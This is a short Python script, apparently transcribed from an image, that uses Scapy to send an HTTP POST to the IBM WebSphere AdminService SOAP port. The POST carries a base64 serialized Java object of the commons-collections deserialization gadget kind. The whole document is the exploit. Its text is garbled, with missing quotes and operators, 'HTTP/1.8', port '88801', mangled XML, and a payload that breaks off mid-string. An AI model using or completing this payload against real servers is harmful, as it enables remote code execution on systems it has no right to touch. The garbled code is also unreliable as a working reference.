#!/usr/local/bin/python

import sys
from scapy.all import *

ip = IP()
ip.src = "1.1.1.1"
ip.dst="1.2.3.4
tcp = TCP()
tcp. sport = 45612
tcp.dport 8880
payload "POST /HTTP/1.8\
Host: 127.0.0.1:88801
Content-Type: text/xml; charset=utf-8\
Content-Length: 2646\
SOAPACtion: urn:AdminService\"\
<?xml version='1.0' encoding='UTF-8'7><SOAP-ENV: Envelope xmlns: SOAP-ENV=\"http://schemas.xmlsoap.
org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instancel" xmlns:xsd=\"http://
www.w3.org/2001/XMLSchema"><SOAP-ENV: Header xmlns:ns0=\"admin\" ns0:WASRemoteRuntimeVersi
on=\"8.5.5.11\" ns0:JMXMessageVersion="1.2.0\" nse:SecurityEnabled=\"true\" ns0:JMXVersion="1
.2.0\"><LoginMethod>BasicAuth</LoginMethod></SOAP-ENV:Header><SOAP-ENV:Body><ns1:getAttribute
xmlns:ns1=\"urn:AdminService\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/
encoding/\"><objectname xsi:type=\"ns1:javax.management.ObjectName\">r00ABXNyADJzdW4ucmVmbGVjdCSh
bm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy361AgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvd
XRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLn
J1Zmx1Y3QuUHJveHnhJ9ogzBBDywIAAUWAAWhOACVMamF2YS9sYW5nL3J1ZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB
+AABzCgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY\
send(ip/tcp/payload)